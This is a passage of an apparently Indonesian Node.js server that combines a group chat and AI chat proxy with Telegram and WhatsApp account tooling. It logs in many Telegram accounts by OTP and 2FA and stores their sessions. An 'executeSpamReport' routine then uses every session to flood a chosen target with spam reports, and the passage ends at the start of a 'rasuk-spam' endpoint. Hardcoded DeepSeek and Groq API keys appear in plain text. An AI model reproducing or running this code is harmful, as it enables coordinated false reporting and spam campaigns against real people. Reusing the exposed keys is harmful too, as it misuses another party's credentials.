  const request = topupRequests.find(r => r.requestId === requestId && r.username === user.username);

  if (!request) {
    return res.json({ 
      valid: true, 
      found: false, 
      message: "Request tidak ditemukan" 
    });
  }

  return res.json({
    valid: true,
    found: true,
    requestId: request.requestId,
    amount: request.amount,
    status: request.status, // pending, approved, rejected
    timestamp: request.timestamp,
    processedAt: request.processedAt || null,
    processedBy: request.processedBy || null
  });
});

// ===== GROUP CHAT API ENDPOINTS =====

// GET /api/chat/messages - Ambil semua pesan chat
app.get("/api/chat/messages", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    // Ambil 100 pesan terakhir
    const messages = chatList
      .slice(-100)
      .map(m => ({
        id: m.id || `${m.from}-${m.to}-${m.time}`,
        from: m.from,
        to: m.to,
        message: m.message,
        timestamp: m.time,
        fromMe: m.from === user.username
      }));

    // Hitung user online (aktif dalam 5 menit terakhir)
    const now = Date.now();
    const activeUsers = new Set();
    chatList.forEach(msg => {
      const msgTime = new Date(msg.time).getTime();
      if (now - msgTime < 5 * 60 * 1000) {
        activeUsers.add(msg.from);
      }
    });

    res.json({
      success: true,
      messages: messages,
      online_users: activeUsers.size,
      your_username: user.username
    });
  } catch (err) {
    console.error("Error fetching messages:", err);
    res.status(500).json({
      success: false,
      message: "Failed to fetch messages"
    });
  }
});

// POST /api/chat/send - Kirim pesan baru
app.post("/api/chat/send", (req, res) => {
  const { key, message } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  if (!message || message.trim().length === 0) {
    return res.json({ 
      success: false, 
      message: "Message cannot be empty" 
    });
  }

  if (message.length > 500) {
    return res.json({ 
      success: false, 
      message: "Message too long (max 500 characters)" 
    });
  }

  try {
    const newMessage = {
      id: `${user.username}-${Date.now()}`,
      from: user.username,
      to: "group", // untuk grup chat
      message: sanitize(message.trim()),
      time: new Date().toISOString()
    };

    chatList.push(newMessage);
    saveChat();

    // Kirim notifikasi ke semua user yang online via WebSocket
    Object.values(wsClients).forEach(client => {
      if (client.readyState === 1) { // WebSocket.OPEN
        client.send(JSON.stringify({
          type: 'newMessage',
          message: newMessage
        }));
      }
    });

    res.json({
      success: true,
      message: "Message sent successfully",
      data: newMessage
    });
  } catch (err) {
    console.error("Error sending message:", err);
    res.status(500).json({
      success: false,
      message: "Failed to send message"
    });
  }
});

// DELETE /api/chat/message/:id - Hapus pesan (hanya pesan sendiri)
app.delete("/api/chat/message/:id", (req, res) => {
  const { key } = req.query;
  const { id } = req.params;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    const messageIndex = chatList.findIndex(m => 
      (m.id === id || `${m.from}-${m.to}-${m.time}` === id)
    );

    if (messageIndex === -1) {
      return res.json({ 
        success: false, 
        message: "Message not found" 
      });
    }

    const message = chatList[messageIndex];

    // Cek apakah user adalah pemilik pesan atau owner
    if (message.from !== user.username && user.role !== "owner") {
      return res.json({ 
        success: false, 
        message: "You can only delete your own messages" 
      });
    }

    chatList.splice(messageIndex, 1);
    saveChat();

    // Broadcast deletion ke semua user online
    Object.values(wsClients).forEach(client => {
      if (client.readyState === 1) {
        client.send(JSON.stringify({
          type: 'messageDeleted',
          messageId: id
        }));
      }
    });

    res.json({
      success: true,
      message: "Message deleted successfully"
    });
  } catch (err) {
    console.error("Error deleting message:", err);
    res.status(500).json({
      success: false,
      message: "Failed to delete message"
    });
  }
});

// GET /api/chat/users - Ambil daftar user yang pernah chat
app.get("/api/chat/users", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    // Ambil semua username unik yang pernah chat
    const usernamesSet = new Set();
    chatList.forEach(msg => {
      usernamesSet.add(msg.from);
    });

    const usernames = Array.from(usernamesSet)
      .filter(u => u !== user.username) // exclude diri sendiri
      .map(username => {
        const userData = db.find(u => u.username === username);
        return {
          username,
          role: userData?.role || "member"
        };
      });

    res.json({
      success: true,
      users: usernames,
      total: usernames.length
    });
  } catch (err) {
    console.error("Error fetching users:", err);
    res.status(500).json({
      success: false,
      message: "Failed to fetch users"
    });
  }
});

// GET /api/chat/history/:username - Ambil history chat dengan user tertentu
app.get("/api/chat/history/:username", (req, res) => {
  const { key } = req.query;
  const { username } = req.params;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    const messages = chatList
      .filter(m => 
        (m.from === user.username && m.to === username) ||
        (m.from === username && m.to === user.username)
      )
      .map(m => ({
        id: m.id || `${m.from}-${m.to}-${m.time}`,
        from: m.from,
        to: m.to,
        message: m.message,
        timestamp: m.time,
        fromMe: m.from === user.username
      }));

    res.json({
      success: true,
      messages: messages,
      with_user: username,
      total: messages.length
    });
  } catch (err) {
    console.error("Error fetching history:", err);
    res.status(500).json({
      success: false,
      message: "Failed to fetch chat history"
    });
  }
});

// ===== AI CHAT ENDPOINT =====
app.post("/api/chat", async (req, res) => {
  const { key, messages } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    const response = await axios.post(
      'https://api.deepseek.com/chat/completions',
      {
        model: 'deepseek-chat',
        messages: messages,
        temperature: 0.7,
        max_tokens: 2000,
        stream: false,
      },
      {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer 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',
        },
        timeout: 30000,
      }
    );

    const aiResponse = response.data.choices[0].message.content;

    return res.json({
      success: true,
      response: aiResponse,
    });
  } catch (error) {
    console.error("AI Chat Error:", error.message);
    return res.json({
      success: false,
      message: "AI service error. Please try again.",
    });
  }
});

// ========== PUBLIC SENDER ENDPOINTS ==========

// 📌 Data structure untuk public senders (disimpan di file JSON)
const PUBLIC_SENDERS_FILE = path.join(__dirname, 'publicSenders.json');

// Load public senders dari file
function loadPublicSenders() {
  try {
    if (fs.existsSync(PUBLIC_SENDERS_FILE)) {
      return JSON.parse(fs.readFileSync(PUBLIC_SENDERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.error("❌ Error loading public senders:", err.message);
  }
  return [];
}

// Save public senders ke file
function savePublicSenders(senders) {
  try {
    fs.writeFileSync(PUBLIC_SENDERS_FILE, JSON.stringify(senders, null, 2));
    console.log("✅ Public senders saved");
  } catch (err) {
    console.error("❌ Error saving public senders:", err.message);
  }
}

// ✅ GET PUBLIC SENDERS - Semua user bisa lihat list public senders
app.get("/getPublicSenders", async (req, res) => {
  try {
    const { key } = req.query;

    if (!key) {
      return res.json({
        valid: false,
        message: "Session key required"
      });
    }

    // Validasi session key
    const user = sikmanuk.find(e => e.sessionKey === key);
    
    if (!user) {
      return res.json({
        valid: false,
        message: "Invalid session key"
      });
    }

    // Load public senders
    const publicSenders = loadPublicSenders();
    
    // Get status dari aktif connections
    const sendersWithStatus = publicSenders.map(sender => {
      const sessionName = sender.sessionName;
      const isActive = biz[sessionName]?.isConnected || mess[sessionName]?.isConnected || false;
      
      return {
        sessionName,
        type: sender.type || "Unknown",
        isActive,
        addedBy: sender.addedBy,
        addedAt: sender.addedAt
      };
    });

    console.log(`📋 [${user.username}] Fetched ${sendersWithStatus.length} public senders`);

    return res.json({
      valid: true,
      senders: sendersWithStatus,
      count: sendersWithStatus.length
    });

  } catch (error) {
    console.error("❌ Error in /getPublicSenders:", error);
    return res.json({
      valid: false,
      message: "Internal server error"
    });
  }
});


// ==========================================
// ENDPOINT 1: GET SESSIONS
// ==========================================
app.get('/api/tools/telegram/sessions', (req, res) => {
  const { key } = req.query;
  
  // Validate key
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }

  try {
    const sessions = Array.from(telegramSessions.entries()).map(([phone, sessionString]) => ({
      phone,
      lastModified: new Date(),
      isActive: telegramClients.has(phone)
    }));

    res.json({
      valid: true,
      sessions
    });
  } catch (error) {
    console.error('Error loading sessions:', error);
    res.json({ valid: false, message: 'Failed to load sessions' });
  }
});

// ==========================================
// ENDPOINT 2: INITIATE LOGIN
// ==========================================
app.get('/api/tools/telegram/login', async (req, res) => {
  const { key, phone } = req.query;
  
  // Validate key
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }

  if (!phone) {
    return res.json({ valid: false, message: 'Phone number required' });
  }

  try {
    const loginId = generateId();
    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, TELEGRAM_API_ID, TELEGRAM_API_HASH, {
      connectionRetries: 5,
    });

    await client.start({
      phoneNumber: async () => phone,
      password: async () => '', // Will be handled separately
      phoneCode: async () => {
        // Code will be provided via /auth endpoint
        return new Promise((resolve) => {
          activeLogins.set(loginId, {
            phone,
            client,
            step: 'wait_code',
            resolveCode: resolve,
            created: Date.now()
          });
        });
      },
      onError: (err) => console.error('Telegram login error:', err),
    });

    res.json({
      valid: true,
      loginId,
      step: 'wait_code',
      message: 'OTP code sent to your Telegram'
    });
  } catch (error) {
    console.error('Error initiating login:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ==========================================
// ENDPOINT 3: SUBMIT AUTH (OTP/PASSWORD)
// ==========================================
app.get('/api/tools/telegram/auth', async (req, res) => {
  const { key, loginId, input } = req.query;
  
  // Validate key
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }

  const loginState = activeLogins.get(loginId);
  if (!loginState) {
    return res.json({ valid: false, message: 'Login session not found' });
  }

  try {
    if (loginState.step === 'wait_code') {
      // Resolve the code promise
      loginState.resolveCode(input);
      
      // Check if 2FA is required
      try {
        await loginState.client.connect();
        const sessionString = loginState.client.session.save();
        
        // Save session
        telegramSessions.set(loginState.phone, sessionString);
        telegramClients.set(loginState.phone, loginState.client);
        
        activeLogins.delete(loginId);
        
        res.json({
          valid: true,
          step: 'completed',
          message: 'Login successful'
        });
      } catch (error) {
        if (error.message.includes('password')) {
          loginState.step = 'wait_password';
          res.json({
            valid: true,
            step: 'wait_password',
            message: '2FA password required'
          });
        } else {
          throw error;
        }
      }
    } else if (loginState.step === 'wait_password') {
      // Handle 2FA password
      await loginState.client.start({
        password: async () => input,
        onError: (err) => console.error('Password error:', err),
      });
      
      const sessionString = loginState.client.session.save();
      telegramSessions.set(loginState.phone, sessionString);
      telegramClients.set(loginState.phone, loginState.client);
      
      activeLogins.delete(loginId);
      
      res.json({
        valid: true,
        step: 'completed',
        message: 'Login successful'
      });
    }
  } catch (error) {
    console.error('Auth error:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ==========================================
// ENDPOINT 4: CHECK LOGIN STATUS
// ==========================================
app.get('/api/tools/telegram/status', (req, res) => {
  const { key, loginId } = req.query;
  
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false });
  }

  const loginState = activeLogins.get(loginId);
  if (!loginState) {
    return res.json({ valid: true, completed: false });
  }

  res.json({
    valid: true,
    completed: loginState.step === 'completed',
    step: loginState.step
  });
});

// ==========================================
// ENDPOINT 5: VERIFY SESSION PASSWORD
// ==========================================
app.post('/api/tools/telegram/verify-session-password', async (req, res) => {
  const { key, phone, password } = req.body;
  
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }

  try {
    const sessionString = telegramSessions.get(phone);
    if (!sessionString) {
      return res.json({ valid: false, message: 'Session not found' });
    }

    const client = new TelegramClient(
      new StringSession(sessionString),
      TELEGRAM_API_ID,
      TELEGRAM_API_HASH,
      { connectionRetries: 5 }
    );

    await client.connect();
    
    // Verify password by attempting to get full user info
    await client.invoke(new Api.account.GetPassword());
    
    telegramClients.set(phone, client);
    
    res.json({ valid: true, message: 'Session verified' });
  } catch (error) {
    console.error('Verify password error:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ==========================================
// ENDPOINT 6: REFRESH SESSIONS
// ==========================================
app.get('/api/tools/telegram/refresh-sessions', async (req, res) => {
  const { key } = req.query;
  
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false });
  }

  try {
    const inactiveSessions = [];
    
    for (const [phone, sessionString] of telegramSessions.entries()) {
      try {
        const client = new TelegramClient(
          new StringSession(sessionString),
          TELEGRAM_API_ID,
          TELEGRAM_API_HASH,
          { connectionRetries: 3 }
        );
        
        await client.connect();
        const me = await client.getMe();
        
        if (me) {
          telegramClients.set(phone, client);
        } else {
          inactiveSessions.push(phone);
          telegramSessions.delete(phone);
          telegramClients.delete(phone);
        }
      } catch (error) {
        inactiveSessions.push(phone);
        telegramSessions.delete(phone);
        telegramClients.delete(phone);
      }
    }

    res.json({
      valid: true,
      inactiveSessions,
      message: `${inactiveSessions.length} inactive sessions removed`
    });
  } catch (error) {
    console.error('Refresh error:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ==========================================
// ENDPOINT 7: REMOVE SESSION
// ==========================================
app.get('/api/tools/telegram/remove-ses', async (req, res) => {
  const { key, phone } = req.query;
  
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false });
  }

  try {
    const client = telegramClients.get(phone);
    if (client) {
      await client.disconnect();
    }
    
    telegramSessions.delete(phone);
    telegramClients.delete(phone);
    
    res.json({ valid: true, message: 'Session removed' });
  } catch (error) {
    console.error('Remove session error:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ==========================================
// ENDPOINT 8: START SPAM REPORT
// ==========================================
app.post('/api/tools/telegram/spam-report', async (req, res) => {
  const { key, target, count, message, link } = req.body;
  
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }

  if (!target) {
    return res.json({ valid: false, message: 'Target required' });
  }

  try {
    const reportId = generateId();
    const activeSessions = Array.from(telegramClients.entries());
    
    if (activeSessions.length === 0) {
      return res.json({ valid: false, message: 'No active sessions' });
    }

    const reportState = {
      reportId,
      target,
      count: parseInt(count) || 50,
      message: message || 'Spam and scam activities',
      link: link || '',
      sessions: activeSessions,
      progress: 0,
      total: activeSessions.length * 10,
      status: 'Starting...',
      completed: false,
      startTime: Date.now()
    };

    activeReports.set(reportId, reportState);

    // Start reporting in background
    executeSpamReport(reportId);

    res.json({
      valid: true,
      reportId,
      message: 'Spam report started'
    });
  } catch (error) {
    console.error('Start report error:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ==========================================
// ENDPOINT 9: GET REPORT STATUS
// ==========================================
app.get('/api/tools/telegram/report-status', (req, res) => {
  const { key, reportId } = req.query;
  
  const user = sikmanuk.find(u => u.key === key);
  if (!user) {
    return res.json({ valid: false });
  }

  const report = activeReports.get(reportId);
  if (!report) {
    return res.json({ valid: false, message: 'Report not found' });
  }

  res.json({
    valid: true,
    report: {
      progress: report.progress,
      total: report.total,
      status: report.status,
      completed: report.completed
    }
  });
});

// ==========================================
// BACKGROUND FUNCTION: EXECUTE SPAM REPORT
// ==========================================
async function executeSpamReport(reportId) {
  const report = activeReports.get(reportId);
  if (!report) return;

  try {
    report.status = 'Resolving target...';
    
    for (let i = 0; i < report.sessions.length; i++) {
      const [phone, client] = report.sessions[i];
      
      report.status = `Session ${i + 1}/${report.sessions.length}: ${phone}`;
      
      try {
        await client.connect();
        
        // Resolve target username or ID
        let targetEntity;
        if (report.target.startsWith('@')) {
          targetEntity = await client.getEntity(report.target);
        } else {
          targetEntity = await client.getEntity(parseInt(report.target));
        }

        // Send reports
        for (let j = 0; j < 10; j++) {
          try {
            await client.invoke(
              new Api.account.ReportPeer({
                peer: targetEntity,
                reason: new Api.InputReportReasonSpam(),
                message: report.message
              })
            );
            
            report.progress++;
            report.status = `Reporting: ${report.progress}/${report.total}`;
            
            // Small delay between reports
            await new Promise(resolve => setTimeout(resolve, 500));
          } catch (err) {
            console.error(`Report error on session ${phone}:`, err);
          }
        }
      } catch (error) {
        console.error(`Error with session ${phone}:`, error);
        report.status = `Error on session ${phone}: ${error.message}`;
      }
    }

    report.completed = true;
    report.status = `Completed! Sent ${report.progress} reports to ${report.target}`;
    
    // Clean up after 5 minutes
    setTimeout(() => {
      activeReports.delete(reportId);
    }, 5 * 60 * 1000);
    
  } catch (error) {
    console.error('Execute report error:', error);
    report.completed = true;
    report.status = `Failed: ${error.message}`;
  }
}

// ==========================================
// CLEANUP: Remove old login sessions
// ==========================================
setInterval(() => {
  const now = Date.now();
  for (const [loginId, state] of activeLogins.entries()) {
    if (now - state.created > 5 * 60 * 1000) { // 5 minutes
      activeLogins.delete(loginId);
    }
  }
}, 60 * 1000); // Check every minute

// ✅ ADD PUBLIC SENDER - Semua role bisa add (Member, Reseller, VIP, Owner)
app.get("/addPublicSender", async (req, res) => {
  try {
    const { key, number } = req.query;

    if (!key || !number) {
      return res.json({
        valid: false,
        message: "Session key and phone number required"
      });
    }

    // Validasi session key
    const user = sikmanuk.find(e => e.sessionKey === key);
    
    if (!user) {
      return res.json({
        valid: false,
        message: "Invalid session key"
      });
    }

    // ✅ Semua role bisa add public sender (tidak ada pengecekan role)

    // Validasi format nomor
    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (cleanNumber.length < 10 || cleanNumber.length > 15) {
      return res.json({
        valid: false,
        message: "Invalid phone number format"
      });
    }

    // Generate session name untuk public sender
    const sessionName = `public_${cleanNumber}`;
    
    // Cek apakah sudah ada
    const publicSenders = loadPublicSenders();
    const exists = publicSenders.find(s => s.sessionName === sessionName);
    
    if (exists) {
      return res.json({
        valid: false,
        message: "This number is already added as public sender"
      });
    }

    // Generate pairing code
    const pairingCode = await generatePairingCode(cleanNumber, sessionName);
    
    if (!pairingCode) {
      return res.json({
        valid: false,
        message: "Failed to generate pairing code"
      });
    }

    // Simpan ke public senders list
    publicSenders.push({
      sessionName,
      phoneNumber: cleanNumber,
      type: "Unknown", // Akan diupdate setelah koneksi
      addedBy: user.username,
      addedByRole: user.role || "Unknown",
      addedAt: new Date().toISOString()
    });
    
    savePublicSenders(publicSenders);

    console.log(`➕ [${user.username}] (${user.role}) Added public sender: ${sessionName}`);

    // Kirim notifikasi ke Telegram
    sendToGroupsUtama(
      `🟢 *Public Sender Added*\n\n` +
      `📱 Number: ${cleanNumber}\n` +
      `👤 Added by: ${user.username}\n` +
      `🎭 Role: ${user.role || 'Unknown'}\n` +
      `🔑 Session: ${sessionName}\n` +
      `⏰ Time: ${new Date().toLocaleString('id-ID')}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      valid: true,
      message: "Public sender added successfully",
      pairingCode,
      sessionName,
      phoneNumber: cleanNumber
    });

  } catch (error) {
    console.error("❌ Error in /addPublicSender:", error);
    return res.json({
      valid: false,
      message: "Internal server error: " + error.message
    });
  }
});

// ✅ DELETE PUBLIC SENDER - Semua role bisa delete (Member, Reseller, VIP, Owner)
app.get("/deletePublicSender", async (req, res) => {
  try {
    const { key, sessionName } = req.query;

    if (!key || !sessionName) {
      return res.json({
        valid: false,
        message: "Session key and session name required"
      });
    }

    // Validasi session key
    const user = sikmanuk.find(e => e.sessionKey === key);
    
    if (!user) {
      return res.json({
        valid: false,
        message: "Invalid session key"
      });
    }

    // ✅ Semua role bisa delete public sender (tidak ada pengecekan role)

    // Load public senders
    let publicSenders = loadPublicSenders();
    const senderIndex = publicSenders.findIndex(s => s.sessionName === sessionName);
    
    if (senderIndex === -1) {
      return res.json({
        valid: false,
        message: "Public sender not found"
      });
    }

    const deletedSender = publicSenders[senderIndex];

    // Hapus dari list
    publicSenders = publicSenders.filter(s => s.sessionName !== sessionName);
    savePublicSenders(publicSenders);

    // Disconnect dan hapus session
    try {
      // Disconnect dari WhatsApp jika sedang aktif
      if (biz[sessionName]?.sock) {
        await biz[sessionName].sock.logout();
        delete biz[sessionName];
      }
      if (mess[sessionName]?.sock) {
        await mess[sessionName].sock.logout();
        delete mess[sessionName];
      }

      // Hapus folder session
      const sessionPath = path.join(__dirname, 'auth_info', sessionName);
      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        console.log(`🗑️ Deleted session folder: ${sessionPath}`);
      }
    } catch (err) {
      console.error("⚠️ Error cleaning up session:", err.message);
    }

    console.log(`🗑️ [${user.username}] (${user.role}) Deleted public sender: ${sessionName}`);

    // Kirim notifikasi ke Telegram
    sendToGroupsUtama(
      `🔴 *Public Sender Deleted*\n\n` +
      `📱 Number: ${deletedSender.phoneNumber}\n` +
      `👤 Deleted by: ${user.username}\n` +
      `🎭 Role: ${user.role || 'Unknown'}\n` +
      `🔑 Session: ${sessionName}\n` +
      `⏰ Time: ${new Date().toLocaleString('id-ID')}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      valid: true,
      message: "Public sender deleted successfully",
      sessionName
    });

  } catch (error) {
    console.error("❌ Error in /deletePublicSender:", error);
    return res.json({
      valid: false,
      message: "Internal server error: " + error.message
    });
  }
});

// ✅ Helper function untuk generate pairing code untuk public sender
async function generatePairingCode(number, sessionName) {
  try {
    const sessionPath = path.join(__dirname, 'auth_info', sessionName);
    
    // Buat folder jika belum ada
    if (!fs.existsSync(sessionPath)) {
      fs.mkdirSync(sessionPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      logger: P({ level: "silent" }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04']
    });

    // Event handler untuk pairing code
    return new Promise((resolve, reject) => {
      let pairingCode = null;
      const timeout = setTimeout(() => {
        sock.end();
        reject(new Error("Timeout generating pairing code"));
      }, 30000); // 30 detik timeout

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
          clearTimeout(timeout);
          
          // Ambil info device type (Business atau Messenger)
          const deviceType = sock.user?.id?.includes(':0@') ? "Messenger" : "Business";
          
          // Update type di public senders
          const publicSenders = loadPublicSenders();
          const senderIndex = publicSenders.findIndex(s => s.sessionName === sessionName);
          if (senderIndex !== -1) {
            publicSenders[senderIndex].type = deviceType;
            savePublicSenders(publicSenders);
          }

          console.log(`✅ Public sender ${sessionName} connected as ${deviceType}`);
          
          // Simpan ke aktif connections
          if (deviceType === "Business") {
            biz[sessionName] = { sock, isConnected: true };
          } else {
            mess[sessionName] = { sock, isConnected: true };
          }

          resolve(pairingCode);
        }

        if (connection === "close") {
          const reason = lastDisconnect?.error?.output?.statusCode;
          
          if (reason === DisconnectReason.loggedOut) {
            console.log(`❌ Public sender ${sessionName} logged out`);
            
            // Hapus dari public senders jika logout
            let publicSenders = loadPublicSenders();
            publicSenders = publicSenders.filter(s => s.sessionName !== sessionName);
            savePublicSenders(publicSenders);
            
            // Hapus folder session
            if (fs.existsSync(sessionPath)) {
              fs.rmSync(sessionPath, { recursive: true, force: true });
            }
          }
        }
      });

      // Request pairing code
      if (!sock.authState.creds.registered) {
        setTimeout(async () => {
          try {
            pairingCode = await sock.requestPairingCode(number);
            console.log(`🔐 Pairing code for ${sessionName}: ${pairingCode}`);
          } catch (err) {
            clearTimeout(timeout);
            sock.end();
            reject(err);
          }
        }, 3000);
      }
    });

  } catch (error) {
    console.error("❌ Error generating pairing code:", error);
    return null;
  }
}

// ✅ Function untuk start semua public senders saat server restart
async function startPublicSenders() {
  try {
    const publicSenders = loadPublicSenders();
    
    if (publicSenders.length === 0) {
      console.log("ℹ️ No public senders to start");
      return;
    }

    console.log(`🚀 Starting ${publicSenders.length} public senders...`);

    for (const sender of publicSenders) {
      const { sessionName } = sender;
      const sessionPath = path.join(__dirname, 'auth_info', sessionName);

      // Skip jika folder tidak ada
      if (!fs.existsSync(sessionPath)) {
        console.log(`⚠️ Session folder not found for ${sessionName}, skipping`);
        continue;
      }

      try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
          version,
          logger: P({ level: "silent" }),
          printQRInTerminal: false,
          auth: state,
          browser: ['Ubuntu', 'Chrome', '20.0.04']
        });

        sock.ev.on("creds.update", saveCreds);

        sock.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;

          if (connection === "open") {
            const deviceType = sock.user?.id?.includes(':0@') ? "Messenger" : "Business";
            
            // Update type di public senders
            const publicSenders = loadPublicSenders();
            const senderIndex = publicSenders.findIndex(s => s.sessionName === sessionName);
            if (senderIndex !== -1) {
              publicSenders[senderIndex].type = deviceType;
              savePublicSenders(publicSenders);
            }

            console.log(`✅ Public sender ${sessionName} connected as ${deviceType}`);
            
            // Simpan ke aktif connections
            if (deviceType === "Business") {
              biz[sessionName] = { sock, isConnected: true };
            } else {
              mess[sessionName] = { sock, isConnected: true };
            }
          }

          if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            
            if (reason === DisconnectReason.loggedOut) {
              console.log(`❌ Public sender ${sessionName} logged out, removing...`);
              
              // Hapus dari public senders
              let publicSenders = loadPublicSenders();
              publicSenders = publicSenders.filter(s => s.sessionName !== sessionName);
              savePublicSenders(publicSenders);
              
              // Hapus folder session
              if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
              }

              // Hapus dari connections
              delete biz[sessionName];
              delete mess[sessionName];
            } else {
              console.log(`⚠️ Public sender ${sessionName} disconnected, retrying...`);
              
              // Auto reconnect setelah 5 detik
              setTimeout(() => {
                startPublicSender(sessionName);
              }, 5000);
            }
          }
        });

      } catch (err) {
        console.error(`❌ Error starting public sender ${sessionName}:`, err.message);
      }

      // Delay antar koneksi
      await sleep(3000);
    }

  } catch (error) {
    console.error("❌ Error in startPublicSenders:", error);
  }
}

// Helper function untuk start satu public sender
async function startPublicSender(sessionName) {
  const sessionPath = path.join(__dirname, 'auth_info', sessionName);

  if (!fs.existsSync(sessionPath)) {
    console.log(`⚠️ Session folder not found for ${sessionName}`);
    return;
  }

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      logger: P({ level: "silent" }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04']
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        const deviceType = sock.user?.id?.includes(':0@') ? "Messenger" : "Business";
        
        console.log(`✅ Public sender ${sessionName} reconnected as ${deviceType}`);
        
        if (deviceType === "Business") {
          biz[sessionName] = { sock, isConnected: true };
        } else {
          mess[sessionName] = { sock, isConnected: true };
        }
      }

      if (connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        
        if (reason !== DisconnectReason.loggedOut) {
          console.log(`⚠️ Public sender ${sessionName} disconnected, retrying...`);
          setTimeout(() => startPublicSender(sessionName), 5000);
        }
      }
    });

  } catch (err) {
    console.error(`❌ Error reconnecting public sender ${sessionName}:`, err.message);
  }
}

// ✅ GRATIS - Groq API (sangat cepat!)
const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
const GROQ_API_KEY = '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'; // Daftar di console.groq.com

app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'AI Chat API is running (Groq)',
  });
});

app.post('/api/chat', async (req, res) => {
  try {
    const { key, messages, message } = req.body;

    if (!key) {
      return res.status(400).json({
        success: false,
        message: 'Session key is required',
      });
    }

    let conversation = userSessions.get(key) || [];
    let chatMessages = messages || conversation;
    
    if (message && typeof message === 'string') {
      chatMessages.push({
        role: 'user',
        content: message,
      });
    }

    if (chatMessages.length === 0 || chatMessages[0].role !== 'system') {
      chatMessages.unshift({
        role: 'system',
        content: 'You are a helpful AI assistant.',
      });
    }

    const formattedMessages = chatMessages.map(msg => ({
      role: msg.role,
      content: msg.content,
    }));

    const response = await axios.post(
      GROQ_API_URL,
      {
        model: 'llama-3.3-70b-versatile', // Model gratis & cepat
        messages: formattedMessages,
        temperature: 0.7,
        max_tokens: 1024,
      },
      {
        headers: {
          'Authorization': `Bearer ${GROQ_API_KEY}`,
          'Content-Type': 'application/json',
        },
        timeout: 60000,
      }
    );

    const aiResponse = response.data.choices[0].message.content;

    chatMessages.push({
      role: 'assistant',
      content: aiResponse,
    });

    userSessions.set(key, chatMessages);

    res.json({
      success: true,
      response: aiResponse,
      message_count: chatMessages.length,
    });

  } catch (error) {
    console.error('❌ Error:', error.response?.data || error.message);
    
    res.status(500).json({
      success: false,
      message: 'Failed to get AI response',
      error: error.message,
    });
  }
});

// ===== ENDPOINT: START SPAM =====
app.post('/api/tools/telegram/rasuk-spam', upload.single('file'), async (req, res) => {
  try {
    const { key, target, type, message, count, delay: delayMs, caption } = req.body;
    
    // Validasi key
    const user = sikmanuk.find(u => u.sessionKey === key);
    if (!user) {
